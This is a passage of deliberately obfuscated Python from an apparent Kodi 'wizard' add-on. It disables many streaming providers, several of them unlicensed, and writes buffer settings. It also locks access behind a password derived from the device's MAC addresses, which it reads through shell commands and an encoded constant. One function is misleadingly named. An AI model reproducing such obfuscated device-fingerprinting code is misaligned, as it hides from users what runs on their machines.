		OOO0O0OO0O0OO0OO0 .setSetting ('provider.kinow','false')#line:1935
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.kinox','false')#line:1936
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.lichtspielhaus','false')#line:1937
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.liomenoi','false')#line:1938
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.magnetdl','false')#line:1941
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.megapelistv','false')#line:1942
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.movie2k-ac','false')#line:1943
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.movie2k-ag','false')#line:1944
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.movie2z','false')#line:1945
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.movie4k','false')#line:1946
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.movie4kis','false')#line:1947
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.movieneo','false')#line:1948
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.moviesever','false')#line:1949
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.movietown','false')#line:1950
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.mvrls','false')#line:1952
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.netzkino','false')#line:1953
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.odb','false')#line:1954
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.openkatalog','false')#line:1955
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.ororo','false')#line:1956
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.paczamy','false')#line:1957
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.peliculasdk','false')#line:1958
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.pelisplustv','false')#line:1959
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.pepecine','false')#line:1960
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.primewire','false')#line:1961
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.projectfreetv','false')#line:1962
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.proxer','false')#line:1963
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.pureanime','false')#line:1964
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.putlocker','false')#line:1965
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.putlockerfree','false')#line:1966
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.reddit','false')#line:1967
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.cartoonwire','false')#line:1968
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.seehd','false')#line:1969
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.segos','false')#line:1970
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.serienstream','false')#line:1971
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.series9','false')#line:1972
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.seriesever','false')#line:1973
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.seriesonline','false')#line:1974
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.seriespapaya','false')#line:1975
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.sezonlukdizi','false')#line:1976
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.solarmovie','false')#line:1977
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.solarmoviez','false')#line:1978
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.stream-to','false')#line:1979
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.streamdream','false')#line:1980
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.streamflix','false')#line:1981
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.streamit','false')#line:1982
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.swatchseries','false')#line:1983
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.szukajkatv','false')#line:1984
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.tainiesonline','false')#line:1985
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.tainiomania','false')#line:1986
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.tata','false')#line:1989
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.trt','false')#line:1990
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.tvbox','false')#line:1991
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.ultrahd','false')#line:1992
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.video4k','false')#line:1993
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.vidics','false')#line:1994
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.view4u','false')#line:1995
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.watchseries','false')#line:1996
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.xrysoi','false')#line:1997
		OOO0O0OO0O0OO0OO0 .setSetting ('provider.library','false')#line:1998
def fixfont ():#line:2001
	OOOOOO00O000OO00O =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:2002
	OO00OO0O0OO00OO00 =json .loads (OOOOOO00O000OO00O );#line:2004
	O0OO00O000OOOO000 =OO00OO0O0OO00OO00 ["result"]["settings"]#line:2005
	OOOO0O0OOO0O00OOO =[OO00OOO0OO0OOO0OO for OO00OOO0OO0OOO0OO in O0OO00O000OOOO000 if OO00OOO0OO0OOO0OO ["id"]=="audiooutput.audiodevice"][0 ]#line:2007
	OO000OOO0O0OOO0OO =OOOO0O0OOO0O00OOO ["options"];#line:2008
	O0O0O0OOOOOOO0000 =OOOO0O0OOO0O00OOO ["value"];#line:2009
	O00O000OOO00O00O0 =[O000OO0OO0OOOOOO0 for (O000OO0OO0OOOOOO0 ,O0OOO0O0000O00OO0 )in enumerate (OO000OOO0O0OOO0OO )if O0OOO0O0000O00OO0 ["value"]==O0O0O0OOOOOOO0000 ][0 ];#line:2011
	OO0O00OOOO0OOO00O =(O00O000OOO00O00O0 +1 )%len (OO000OOO0O0OOO0OO )#line:2013
	O0O0O0000OO0O0000 =OO000OOO0O0OOO0OO [OO0O00OOOO0OOO00O ]["value"]#line:2015
	O0O00O0O0OO0OOO0O =OO000OOO0O0OOO0OO [OO0O00OOOO0OOO00O ]["label"]#line:2016
	OO000000O0O00OOO0 =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:2018
	try :#line:2020
		OOO0000000OO000O0 =json .loads (OO000000O0O00OOO0 );#line:2021
		if OOO0000000OO000O0 ["result"]!=True :#line:2023
			raise Exception #line:2024
	except :#line:2025
		sys .stderr .write ("Error switching audio output device")#line:2026
		raise Exception #line:2027
def parseDOM2 (O0OO0O0O0000O0000 ,name =u"",attrs ={},ret =False ):#line:2028
	if isinstance (O0OO0O0O0000O0000 ,str ):#line:2031
		try :#line:2032
			O0OO0O0O0000O0000 =[O0OO0O0O0000O0000 .decode ("utf-8")]#line:2033
		except :#line:2034
			O0OO0O0O0000O0000 =[O0OO0O0O0000O0000 ]#line:2035
	elif isinstance (O0OO0O0O0000O0000 ,unicode ):#line:2036
		O0OO0O0O0000O0000 =[O0OO0O0O0000O0000 ]#line:2037
	elif not isinstance (O0OO0O0O0000O0000 ,list ):#line:2038
		return u""#line:2039
	if not name .strip ():#line:2041
		return u""#line:2042
	OOOOOOOO0OO00000O =[]#line:2044
	for O00O0000O0O0OOO00 in O0OO0O0O0000O0000 :#line:2045
		O0OOOOOO00OO0000O =re .compile ('(<[^>]*?\n[^>]*?>)').findall (O00O0000O0O0OOO00 )#line:2046
		for O0OO0O0O000O0000O in O0OOOOOO00OO0000O :#line:2047
			O00O0000O0O0OOO00 =O00O0000O0O0OOO00 .replace (O0OO0O0O000O0000O ,O0OO0O0O000O0000O .replace ("\n"," "))#line:2048
		O0OO0O0O00O00OO0O =[]#line:2050
		for O00O00OO000000000 in attrs :#line:2051
			OO000O0O0OOO0OO0O =re .compile ('(<'+name +'[^>]*?(?:'+O00O00OO000000000 +'=[\'"]'+attrs [O00O00OO000000000 ]+'[\'"].*?>))',re .M |re .S ).findall (O00O0000O0O0OOO00 )#line:2052
			if len (OO000O0O0OOO0OO0O )==0 and attrs [O00O00OO000000000 ].find (" ")==-1 :#line:2053
				OO000O0O0OOO0OO0O =re .compile ('(<'+name +'[^>]*?(?:'+O00O00OO000000000 +'='+attrs [O00O00OO000000000 ]+'.*?>))',re .M |re .S ).findall (O00O0000O0O0OOO00 )#line:2054
			if len (O0OO0O0O00O00OO0O )==0 :#line:2056
				O0OO0O0O00O00OO0O =OO000O0O0OOO0OO0O #line:2057
				OO000O0O0OOO0OO0O =[]#line:2058
			else :#line:2059
				OO000O0O0OO0OOOOO =range (len (O0OO0O0O00O00OO0O ))#line:2060
				OO000O0O0OO0OOOOO .reverse ()#line:2061
				for O00O0O000000000OO in OO000O0O0OO0OOOOO :#line:2062
					if not O0OO0O0O00O00OO0O [O00O0O000000000OO ]in OO000O0O0OOO0OO0O :#line:2063
						del (O0OO0O0O00O00OO0O [O00O0O000000000OO ])#line:2064
		if len (O0OO0O0O00O00OO0O )==0 and attrs =={}:#line:2066
			O0OO0O0O00O00OO0O =re .compile ('(<'+name +'>)',re .M |re .S ).findall (O00O0000O0O0OOO00 )#line:2067
			if len (O0OO0O0O00O00OO0O )==0 :#line:2068
				O0OO0O0O00O00OO0O =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (O00O0000O0O0OOO00 )#line:2069
		if isinstance (ret ,str ):#line:2071
			OO000O0O0OOO0OO0O =[]#line:2072
			for O0OO0O0O000O0000O in O0OO0O0O00O00OO0O :#line:2073
				OO0OO000O0O0OO0OO =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (O0OO0O0O000O0000O )#line:2074
				if len (OO0OO000O0O0OO0OO )==0 :#line:2075
					OO0OO000O0O0OO0OO =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (O0OO0O0O000O0000O )#line:2076
				for OO0O0OO00O0000O00 in OO0OO000O0O0OO0OO :#line:2077
					O0OOO00OO00O0OO00 =OO0O0OO00O0000O00 [0 ]#line:2078
					if O0OOO00OO00O0OO00 in "'\"":#line:2079
						if OO0O0OO00O0000O00 .find ('='+O0OOO00OO00O0OO00 ,OO0O0OO00O0000O00 .find (O0OOO00OO00O0OO00 ,1 ))>-1 :#line:2080
							OO0O0OO00O0000O00 =OO0O0OO00O0000O00 [:OO0O0OO00O0000O00 .find ('='+O0OOO00OO00O0OO00 ,OO0O0OO00O0000O00 .find (O0OOO00OO00O0OO00 ,1 ))]#line:2081
						if OO0O0OO00O0000O00 .rfind (O0OOO00OO00O0OO00 ,1 )>-1 :#line:2083
							OO0O0OO00O0000O00 =OO0O0OO00O0000O00 [1 :OO0O0OO00O0000O00 .rfind (O0OOO00OO00O0OO00 )]#line:2084
					else :#line:2085
						if OO0O0OO00O0000O00 .find (" ")>0 :#line:2086
							OO0O0OO00O0000O00 =OO0O0OO00O0000O00 [:OO0O0OO00O0000O00 .find (" ")]#line:2087
						elif OO0O0OO00O0000O00 .find ("/")>0 :#line:2088
							OO0O0OO00O0000O00 =OO0O0OO00O0000O00 [:OO0O0OO00O0000O00 .find ("/")]#line:2089
						elif OO0O0OO00O0000O00 .find (">")>0 :#line:2090
							OO0O0OO00O0000O00 =OO0O0OO00O0000O00 [:OO0O0OO00O0000O00 .find (">")]#line:2091
					OO000O0O0OOO0OO0O .append (OO0O0OO00O0000O00 .strip ())#line:2093
			O0OO0O0O00O00OO0O =OO000O0O0OOO0OO0O #line:2094
		else :#line:2095
			OO000O0O0OOO0OO0O =[]#line:2096
			for O0OO0O0O000O0000O in O0OO0O0O00O00OO0O :#line:2097
				O0O00000000000O00 =u"</"+name #line:2098
				O000OO00OO0000O00 =O00O0000O0O0OOO00 .find (O0OO0O0O000O0000O )#line:2100
				O000O0O0OO00OOOO0 =O00O0000O0O0OOO00 .find (O0O00000000000O00 ,O000OO00OO0000O00 )#line:2101
				OOOO0000O00O0OO0O =O00O0000O0O0OOO00 .find ("<"+name ,O000OO00OO0000O00 +1 )#line:2102
				while OOOO0000O00O0OO0O <O000O0O0OO00OOOO0 and OOOO0000O00O0OO0O !=-1 :#line:2104
					OOO0O0OOOOOOO0O00 =O00O0000O0O0OOO00 .find (O0O00000000000O00 ,O000O0O0OO00OOOO0 +len (O0O00000000000O00 ))#line:2105
					if OOO0O0OOOOOOO0O00 !=-1 :#line:2106
						O000O0O0OO00OOOO0 =OOO0O0OOOOOOO0O00 #line:2107
					OOOO0000O00O0OO0O =O00O0000O0O0OOO00 .find ("<"+name ,OOOO0000O00O0OO0O +1 )#line:2108
				if O000OO00OO0000O00 ==-1 and O000O0O0OO00OOOO0 ==-1 :#line:2110
					OO0O0O0OO0O000O0O =u""#line:2111
				elif O000OO00OO0000O00 >-1 and O000O0O0OO00OOOO0 >-1 :#line:2112
					OO0O0O0OO0O000O0O =O00O0000O0O0OOO00 [O000OO00OO0000O00 +len (O0OO0O0O000O0000O ):O000O0O0OO00OOOO0 ]#line:2113
				elif O000O0O0OO00OOOO0 >-1 :#line:2114
					OO0O0O0OO0O000O0O =O00O0000O0O0OOO00 [:O000O0O0OO00OOOO0 ]#line:2115
				elif O000OO00OO0000O00 >-1 :#line:2116
					OO0O0O0OO0O000O0O =O00O0000O0O0OOO00 [O000OO00OO0000O00 +len (O0OO0O0O000O0000O ):]#line:2117
				if ret :#line:2119
					O0O00000000000O00 =O00O0000O0O0OOO00 [O000O0O0OO00OOOO0 :O00O0000O0O0OOO00 .find (">",O00O0000O0O0OOO00 .find (O0O00000000000O00 ))+1 ]#line:2120
					OO0O0O0OO0O000O0O =O0OO0O0O000O0000O +OO0O0O0OO0O000O0O +O0O00000000000O00 #line:2121
				O00O0000O0O0OOO00 =O00O0000O0O0OOO00 [O00O0000O0O0OOO00 .find (OO0O0O0OO0O000O0O ,O00O0000O0O0OOO00 .find (O0OO0O0O000O0000O ))+len (OO0O0O0OO0O000O0O ):]#line:2123
				OO000O0O0OOO0OO0O .append (OO0O0O0OO0O000O0O )#line:2124
			O0OO0O0O00O00OO0O =OO000O0O0OOO0OO0O #line:2125
		OOOOOOOO0OO00000O +=O0OO0O0O00O00OO0O #line:2126
	return OOOOOOOO0OO00000O #line:2128
def addItem (OOO0O0O00O0OOOOO0 ,O00O0OO000OOOOOOO ,O0OOO000O0OO0O0O0 ,OO00OO0O0O0OO0000 ,O00OO00O00OOO0000 ,description =None ):#line:2130
	if description ==None :description =''#line:2131
	description ='[COLOR white]'+description +'[/COLOR]'#line:2132
	O00OOO0OOO0O0OO00 =sys .argv [0 ]+"?url="+urllib .quote_plus (O00O0OO000OOOOOOO )+"&mode="+str (O0OOO000O0OO0O0O0 )+"&name="+urllib .quote_plus (OOO0O0O00O0OOOOO0 )+"&iconimage="+urllib .quote_plus (OO00OO0O0O0OO0000 )+"&fanart="+urllib .quote_plus (O00OO00O00OOO0000 )#line:2133
	OO0OOO0O00000O0OO =True #line:2134
	OOOO0O0OO0OO0O0O0 =xbmcgui .ListItem (OOO0O0O00O0OOOOO0 ,iconImage =OO00OO0O0O0OO0000 ,thumbnailImage =OO00OO0O0O0OO0000 )#line:2135
	OOOO0O0OO0OO0O0O0 .setInfo (type ="Video",infoLabels ={"Title":OOO0O0O00O0OOOOO0 ,"Plot":description })#line:2136
	OOOO0O0OO0OO0O0O0 .setProperty ("fanart_Image",O00OO00O00OOO0000 )#line:2137
	OOOO0O0OO0OO0O0O0 .setProperty ("icon_Image",OO00OO0O0O0OO0000 )#line:2138
	OO0OOO0O00000O0OO =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O00OOO0OOO0O0OO00 ,listitem =OOOO0O0OO0OO0O0O0 ,isFolder =False )#line:2139
	return OO0OOO0O00000O0OO #line:2140
def get_params ():#line:2142
		OO0OO00O0O000O00O =[]#line:2143
		OO000O0O00000000O =sys .argv [2 ]#line:2144
		if len (OO000O0O00000000O )>=2 :#line:2145
				O0OOOO00O0OOO00O0 =sys .argv [2 ]#line:2146
				OO000OOO00OO00000 =O0OOOO00O0OOO00O0 .replace ('?','')#line:2147
				if (O0OOOO00O0OOO00O0 [len (O0OOOO00O0OOO00O0 )-1 ]=='/'):#line:2148
						O0OOOO00O0OOO00O0 =O0OOOO00O0OOO00O0 [0 :len (O0OOOO00O0OOO00O0 )-2 ]#line:2149
				O0000OO0O0OOO000O =OO000OOO00OO00000 .split ('&')#line:2150
				OO0OO00O0O000O00O ={}#line:2151
				for OOO0OO0O0OO000O00 in range (len (O0000OO0O0OOO000O )):#line:2152
						O00OOOOO0O00OO00O ={}#line:2153
						O00OOOOO0O00OO00O =O0000OO0O0OOO000O [OOO0OO0O0OO000O00 ].split ('=')#line:2154
						if (len (O00OOOOO0O00OO00O ))==2 :#line:2155
								OO0OO00O0O000O00O [O00OOOOO0O00OO00O [0 ]]=O00OOOOO0O00OO00O [1 ]#line:2156
		return OO0OO00O0O000O00O #line:2158
def decode (OO00O0OO0O00O00OO ,OO00000O0OOO0000O ):#line:2163
    import base64 #line:2164
    OO0O0OOOO0O00OO00 =[]#line:2165
    if (len (OO00O0OO0O00O00OO ))!=4 :#line:2167
     return 10 #line:2168
    OO00000O0OOO0000O =base64 .urlsafe_b64decode (OO00000O0OOO0000O )#line:2169
    for OOOOOOO0O0OOOOOO0 in range (len (OO00000O0OOO0000O )):#line:2171
        OO00OOOOO00OOOOOO =OO00O0OO0O00O00OO [OOOOOOO0O0OOOOOO0 %len (OO00O0OO0O00O00OO )]#line:2172
        O00OO00OO00OO0OO0 =chr ((256 +ord (OO00000O0OOO0000O [OOOOOOO0O0OOOOOO0 ])-ord (OO00OOOOO00OOOOOO ))%256 )#line:2173
        OO0O0OOOO0O00OO00 .append (O00OO00OO00OO0OO0 )#line:2174
    return "".join (OO0O0OOOO0O00OO00 )#line:2175
def tmdb_list (OOO0O00OO0OOOO000 ):#line:2176
    O0OOO0OOO00OO00O0 =decode ("7643",OOO0O00OO0OOOO000 )#line:2179
    return int (O0OOO0OOO00OO00O0 )#line:2182
def u_list (OOOO000OOOO00OOOO ):#line:2183
    if xbmc .getCondVisibility ('system.platform.windows')or xbmc .getCondVisibility ('system.platform.android'):#line:2185
        from math import sqrt #line:2186
        O0O0OO00O0O0O0OOO =tmdb_list (TMDB_NEW_API )#line:2187
        O0O00OOOO0O0O0O00 =str ((getHwAddr ('eth0'))*O0O0OO00O0O0O0OOO )#line:2189
        OO00O0000000O0O00 =int (O0O00OOOO0O0O0O00 [1 ]+O0O00OOOO0O0O0O00 [2 ]+O0O00OOOO0O0O0O00 [5 ]+O0O00OOOO0O0O0O00 [7 ])#line:2190
        O000O0O0000OO00O0 =(ADDON .getSetting ("pass"))#line:2192
        OO0O0OO0O0O0OOOOO =(str (round (sqrt ((OO00O0000000O0O00 *500 )+30 )+30 ,4 ))[-4 :]).replace ('.','')#line:2197
        if '.'in OO0O0OO0O0O0OOOOO :#line:2199
         OO0O0OO0O0O0OOOOO =(str (round (sqrt ((OO00O0000000O0O00 *500 )+30 )+30 ,4 ))[-5 :]).replace ('.','')#line:2200
        if O000O0O0000OO00O0 ==OO0O0OO0O0O0OOOOO :#line:2202
          O00O0O0O0O00OOOO0 =OOOO000OOOO00OOOO #line:2204
        else :#line:2206
           if STARTP2 ()and STARTP ()=='ok':#line:2207
             return OOOO000OOOO00OOOO #line:2210
           O00O0O0O0O00OOOO0 ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:2211
           xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:2212
           sys .exit ()#line:2213
        return O00O0O0O0O00OOOO0 #line:2214
    else :#line:2215
        STARTP ()#line:2216
def disply_hwr ():#line:2220
   try :#line:2221
    OO0O00000O00OO00O =tmdb_list (TMDB_NEW_API )#line:2222
    O0O0OO00O0OOOOOOO =str ((getHwAddr ('eth0'))*OO0O00000O00OO00O )#line:2223
    O00OOO0OO00O00OO0 =(O0O0OO00O0OOOOOOO [1 ]+O0O0OO00O0OOOOOOO [2 ]+O0O0OO00O0OOOOOOO [5 ]+O0O0OO00O0OOOOOOO [7 ])#line:2230
    OO0OO00OO000000OO =(ADDON .getSetting ("action"))#line:2231
    wiz .setS ('action',str (O00OOO0OO00O00OO0 ))#line:2233
   except :pass #line:2234
def disply_hwr2 ():#line:2235
   try :#line:2236
    OO00OOOOO00OO00OO =tmdb_list (TMDB_NEW_API )#line:2237
    O000O000OOO0O00OO =str ((getHwAddr ('eth0'))*OO00OOOOO00OO00OO )#line:2239
    O0OO0OOOO00OO0OO0 =(O000O000OOO0O00OO [1 ]+O000O000OOO0O00OO [2 ]+O000O000OOO0O00OO [5 ]+O000O000OOO0O00OO [7 ])#line:2248
    OO0O0OO00O00OOO00 =(ADDON .getSetting ("action"))#line:2249
    xbmcgui .Dialog ().ok ("[COLOR yellow] לשלוח את הקוד למנהלים [/COLOR]",O0OO0OOOO00OO0OO0 )#line:2252
   except :pass #line:2253
def getHwAddr (OOOOOOOO00OOOOOOO ):#line:2255
   import subprocess ,time #line:2256
   OOO000O00OOO0O00O ='windows'#line:2257
   if xbmc .getCondVisibility ('system.platform.android'):#line:2258
       OOO000O00OOO0O00O ='android'#line:2259
   if xbmc .getCondVisibility ('system.platform.android'):#line:2260
     O0OOOO0O00OOOO00O =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:2261
     OO0O0O00OO0O00O0O =re .compile ('link/ether (.+?) brd').findall (str (O0OOOO0O00OOOO00O ))#line:2263
     OOOOO000O0000O0O0 =0 #line:2264
     for OOO00000O00000OOO in OO0O0O00OO0O00O0O :#line:2265
      if OO0O0O00OO0O00O0O !='00:00:00:00:00:00':#line:2266
          O0O0000O0O0O00OO0 =OOO00000O00000OOO #line:2267
          OOOOO000O0000O0O0 =OOOOO000O0000O0O0 +int (O0O0000O0O0O00OO0 .replace (':',''),16 )#line:2268
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:2270
       OO0OOOO0O0O0OOOO0 =0 #line:2271
       OOOOO000O0000O0O0 =0 #line:2272
       O0O00OO000OOOO0OO =[]#line:2273
       O0O00O00000000000 =os .popen ("getmac").read ()#line:2274
       O0O00O00000000000 =O0O00O00000000000 .split ("\n")#line:2275
       for O0OOO000OO0OOO0O0 in O0O00O00000000000 :#line:2277
            O0OO0OOOOOO0O00OO =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',O0OOO000OO0OOO0O0 ,re .I )#line:2278
            if O0OO0OOOOOO0O00OO :#line:2279
                OO0O0O00OO0O00O0O =O0OO0OOOOOO0O00OO .group ().replace ('-',':')#line:2280
                O0O00OO000OOOO0OO .append (OO0O0O00OO0O00O0O )#line:2281
                OOOOO000O0000O0O0 =OOOOO000O0000O0O0 +int (OO0O0O00OO0O00O0O .replace (':',''),16 )#line:2284
   else :#line:2286
         wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]לא ניתן לנפק קוד, פנה למנהלים.[/COLOR]'%COLOR2 )#line:2287
   try :#line:2304
    return OOOOO000O0000O0O0 #line:2305
   except :pass #line:2306
def getpass ():#line:2307
	disply_hwr2 ()#line:2309
def setpass ():#line:2310
    O0OO00O0000O0OOO0 =xbmcgui .Dialog ()#line:2311
    OO00O0000O0OO0000 =''#line:2312
    OO0000O00OOOOO0O0 =xbmc .Keyboard (OO00O0000O0OO0000 ,'הכנס סיסמה')#line:2314
    OO0000O00OOOOO0O0 .doModal ()#line:2315
    if OO0000O00OOOOO0O0 .isConfirmed ():#line:2316
           OO0000O00OOOOO0O0 =OO0000O00OOOOO0O0 .getText ()#line:2317
    wiz .setS ('pass',str (OO0000O00OOOOO0O0 ))#line:2318
def setuname ():#line:2319
    O0OO0OO0O00O0O00O =''#line:2320
    O0O0O000000OO00O0 =xbmc .Keyboard (O0OO0OO0O00O0O00O ,'הכנס שם משתמש')#line:2321
    O0O0O000000OO00O0 .doModal ()#line:2322
    if O0O0O000000OO00O0 .isConfirmed ():#line:2323
           O0OO0OO0O00O0O00O =O0O0O000000OO00O0 .getText ()#line:2324
           wiz .setS ('user',str (O0OO0OO0O00O0O00O ))#line:2325
def powerkodi ():#line:2326
    os ._exit (1 )#line:2327
def buffer1 ():#line:2329
	OOOO0O0000000O00O =xbmc .translatePath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:2330
	O0000000OOOOO00OO =xbmc .getInfoLabel ("System.Memory(total)")#line:2331
	O0O00OOO000OOO0OO =xbmc .getInfoLabel ("System.FreeMemory")#line:2332
	O0O0OOO00O000O00O =re .sub ('[^0-9]','',O0O00OOO000OOO0OO )#line:2333
	O0O0OOO00O000O00O =int (O0O0OOO00O000O00O )/3 #line:2334
	OOO00OOOOOOO00OO0 =O0O0OOO00O000O00O *1024 *1024 #line:2335
	try :OOOOO0O00OOO000OO =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:2336
	except :OOOOO0O00OOO000OO =16 #line:2337
	OOOO00OOO0OO0O0O0 =DIALOG .yesno ('FREE MEMORY: '+str (O0O00OOO000OOO0OO ),'Based on your free Memory your optimal buffersize is: '+str (O0O0OOO00O000O00O )+' MB','Choose an Option below...',yeslabel ='Use Optimal',nolabel ='Input a Value')#line:2340
	if OOOO00OOO0OO0O0O0 ==1 :#line:2341
		with open (OOOO0O0000000O00O ,"w")as O00O000000000OO0O :#line:2342
			if OOOOO0O00OOO000OO >=17 :OOOO0OO00OOOOOOO0 =xml_data_advSettings_New (str (OOO00OOOOOOO00OO0 ))#line:2343
			else :OOOO0OO00OOOOOOO0 =xml_data_advSettings_old (str (OOO00OOOOOOO00OO0 ))#line:2344
			O00O000000000OO0O .write (OOOO0OO00OOOOOOO0 )#line:2346
			DIALOG .ok ('Buffer Size Set to: '+str (OOO00OOOOOOO00OO0 ),'Please restart Kodi for settings to apply.','')#line:2347
	elif OOOO00OOO0OO0O0O0 ==0 :#line:2349
		OOO00OOOOOOO00OO0 =_O0O000OOOO0OOOOOO (default =str (OOO00OOOOOOO00OO0 ),heading ="INPUT BUFFER SIZE")#line:2350
		with open (OOOO0O0000000O00O ,"w")as O00O000000000OO0O :#line:2351
			if OOOOO0O00OOO000OO >=17 :OOOO0OO00OOOOOOO0 =xml_data_advSettings_New (str (OOO00OOOOOOO00OO0 ))#line:2352
			else :OOOO0OO00OOOOOOO0 =xml_data_advSettings_old (str (OOO00OOOOOOO00OO0 ))#line:2353
			O00O000000000OO0O .write (OOOO0OO00OOOOOOO0 )#line:2354
			DIALOG .ok ('Buffer Size Set to: '+str (OOO00OOOOOOO00OO0 ),'Please restart Kodi for settings to apply.','')#line:2355
def xml_data_advSettings_old (OO00OOOOO000000OO ):#line:2356
	O000O00OO0O0OOO0O ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
		<cachemembuffersize>%s</cachemembuffersize> 
		<buffermode>2</buffermode>
		<readbufferfactor>20</readbufferfactor>
	  </network>
</advancedsettings>"""%OO00OOOOO000000OO #line:2366
	return O000O00OO0O0OOO0O #line:2367
def xml_data_advSettings_New (OO0O00OOOOO0000OO ):#line:2369
	O0O0OO000OOOO00OO ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
	  </network>
	  <cache>
		<memorysize>%s</memorysize> 
		<buffermode>2</buffermode>
		<readfactor>20</readfactor>
	  </cache>
</advancedsettings>"""%OO0O00OOOOO0000OO #line:2381
	return O0O0OO000OOOO00OO #line:2382
def write_ADV_SETTINGS_XML (O0O000000000OOOOO ):#line:2383
    if not os .path .exists (xml_file ):#line:2384
        with open (xml_file ,"w")as OO00OOO00O00OOOOO :#line:2385
            OO00OOO00O00OOOOO .write (xml_data )#line:2386
def _O0O000OOOO0OOOOOO (default ="",heading ="",hidden =False ):#line:2387
    ""#line:2388
    O0OOO0O0OO000O0O0 =xbmc .Keyboard (default ,heading ,hidden )#line:2389
    O0OOO0O0OO000O0O0 .doModal ()#line:2390
    if (O0OOO0O0OO000O0O0 .isConfirmed ()):#line:2391
        return unicode (O0OOO0O0OO000O0O0 .getText (),"utf-8")#line:2392
    return default #line:2393
def index ():#line:2395
	addFile ('[COLOR green]קוד חומרה שלך: %s [/COLOR]'%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:2396
	addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2397
	if AUTOUPDATE =='Yes':#line:2398
		if wiz .workingURL (WIZARDFILE )==True :#line:2399
			O00000OOOOOOO0OO0 =wiz .checkWizard ('version')#line:2400
			if O00000OOOOOOO0OO0 >VERSION :addFile ('%s [v%s] [COLOR red][B][UPDATE v%s][/B][/COLOR]גירסת ויזארד: '%(ADDONTITLE ,VERSION ,O00000OOOOOOO0OO0 ),'wizardupdate',themeit =THEME2 )#line:2401
			else :addFile ('%s [v%s] :גירסת ויזארד'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2402
		else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2403
	else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2404
	if len (BUILDNAME )>0 :#line:2405
